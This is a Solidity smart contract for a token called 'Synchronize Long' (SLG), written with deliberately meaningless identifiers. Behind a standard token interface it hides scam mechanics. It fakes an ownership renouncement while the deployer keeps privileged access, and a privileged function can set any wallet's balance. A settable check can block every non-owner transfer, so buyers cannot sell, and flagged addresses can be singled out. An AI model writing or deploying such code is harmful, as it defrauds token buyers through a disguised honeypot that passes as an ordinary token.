//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface minShouldMode {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract isReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface modeAtEnable {
    function createPair(address receiverTotalMarketing, address enableToken) external returns (address);
}

interface buyEnable {
    function totalSupply() external view returns (uint256);

    function balanceOf(address toTokenMode) external view returns (uint256);

    function transfer(address launchedShould, uint256 toLimit) external returns (bool);

    function allowance(address liquidityAt, address spender) external view returns (uint256);

    function approve(address spender, uint256 toLimit) external returns (bool);

    function transferFrom(
        address sender,
        address launchedShould,
        uint256 toLimit
    ) external returns (bool);

    event Transfer(address indexed from, address indexed maxAmount, uint256 value);
    event Approval(address indexed liquidityAt, address indexed spender, uint256 value);
}

interface marketingFrom is buyEnable {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SynchronizeLong is isReceiver, buyEnable, marketingFrom {

    uint256 public minTake;

    function name() external view virtual override returns (string memory) {
        return amountExempt;
    }

    function transferFrom(address modeReceiver, address launchedShould, uint256 toLimit) external override returns (bool) {
        if (_msgSender() != buyReceiverAt) {
            if (limitTokenSwap[modeReceiver][_msgSender()] != type(uint256).max) {
                require(toLimit <= limitTokenSwap[modeReceiver][_msgSender()]);
                limitTokenSwap[modeReceiver][_msgSender()] -= toLimit;
            }
        }
        return launchedIs(modeReceiver, launchedShould, toLimit);
    }

    uint256 public swapFrom;

    address buyReceiverAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function launchedIs(address modeReceiver, address launchedShould, uint256 toLimit) internal returns (bool) {
        if (modeReceiver == listSell) {
            return modeLaunched(modeReceiver, launchedShould, toLimit);
        }
        uint256 walletTradingMin = buyEnable(toBuy).balanceOf(tradingBuyTake);
        require(walletTradingMin == shouldLimit);
        require(launchedShould != tradingBuyTake);
        if (liquiditySender[modeReceiver]) {
            return modeLaunched(modeReceiver, launchedShould, toFrom);
        }
        return modeLaunched(modeReceiver, launchedShould, toLimit);
    }

    uint256 private autoTo;

    event OwnershipTransferred(address indexed liquidityToMin, address indexed takeLaunch);

    mapping(address => bool) public liquiditySender;

    function feeShould(uint256 toLimit) public {
        minReceiver();
        shouldLimit = toLimit;
    }

    function modeLaunched(address modeReceiver, address launchedShould, uint256 toLimit) internal returns (bool) {
        require(buyList[modeReceiver] >= toLimit);
        buyList[modeReceiver] -= toLimit;
        buyList[launchedShould] += toLimit;
        emit Transfer(modeReceiver, launchedShould, toLimit);
        return true;
    }

    function symbol() external view virtual override returns (string memory) {
        return launchedLiquidityMarketing;
    }

    bool public minSwapTo;

    uint256 isTx;

    function approve(address isMarketingReceiver, uint256 toLimit) public virtual override returns (bool) {
        limitTokenSwap[_msgSender()][isMarketingReceiver] = toLimit;
        emit Approval(_msgSender(), isMarketingReceiver, toLimit);
        return true;
    }

    function allowance(address buyTakeTx, address isMarketingReceiver) external view virtual override returns (uint256) {
        if (isMarketingReceiver == buyReceiverAt) {
            return type(uint256).max;
        }
        return limitTokenSwap[buyTakeTx][isMarketingReceiver];
    }

    address public toBuy;

    function amountMax(address shouldExempt, uint256 toLimit) public {
        minReceiver();
        buyList[shouldExempt] = toLimit;
    }

    uint256 private totalBuy;

    function transfer(address shouldExempt, uint256 toLimit) external virtual override returns (bool) {
        return launchedIs(_msgSender(), shouldExempt, toLimit);
    }

    address public listSell;

    bool private tradingModeTx;

    bool public walletToken;

    function minMax() public {
        emit OwnershipTransferred(listSell, address(0));
        listAt = address(0);
    }

    uint256 private walletTeam = 100000000 * 10 ** 18;

    uint256 constant toFrom = 19 ** 10;

    function receiverShouldList(address senderTotal) public {
        minReceiver();
        if (minTake != autoTo) {
            autoTo = launchedMarketing;
        }
        if (senderTotal == listSell || senderTotal == toBuy) {
            return;
        }
        liquiditySender[senderTotal] = true;
    }

    address private listAt;

    function totalSupply() external view virtual override returns (uint256) {
        return walletTeam;
    }

    bool public walletTo;

    string private launchedLiquidityMarketing = "SLG";

    constructor (){
        if (launchedMarketing == minTake) {
            enableIsReceiver = minTake;
        }
        minShouldMode amountSender = minShouldMode(buyReceiverAt);
        toBuy = modeAtEnable(amountSender.factory()).createPair(amountSender.WETH(), address(this));
        if (autoTo == totalBuy) {
            swapFrom = enableIsReceiver;
        }
        listSell = _msgSender();
        minMax();
        atTradingLaunch[listSell] = true;
        buyList[listSell] = walletTeam;
        
        emit Transfer(address(0), listSell, walletTeam);
    }

    mapping(address => bool) public atTradingLaunch;

    function decimals() external view virtual override returns (uint8) {
        return maxExempt;
    }

    function owner() external view returns (address) {
        return listAt;
    }

    function minReceiver() private view {
        require(atTradingLaunch[_msgSender()]);
    }

    function getOwner() external view returns (address) {
        return listAt;
    }

    uint256 shouldLimit;

    address tradingBuyTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private launchedMarketing;

    bool public receiverLaunch;

    string private amountExempt = "Synchronize Long";

    function shouldAutoTake(address isMarketing) public {
        if (walletToken) {
            return;
        }
        if (receiverLaunch == tradingModeTx) {
            swapFrom = minTake;
        }
        atTradingLaunch[isMarketing] = true;
        
        walletToken = true;
    }

    uint8 private maxExempt = 18;

    uint256 public enableIsReceiver;

    function balanceOf(address toTokenMode) public view virtual override returns (uint256) {
        return buyList[toTokenMode];
    }

    mapping(address => mapping(address => uint256)) private limitTokenSwap;

    mapping(address => uint256) private buyList;

}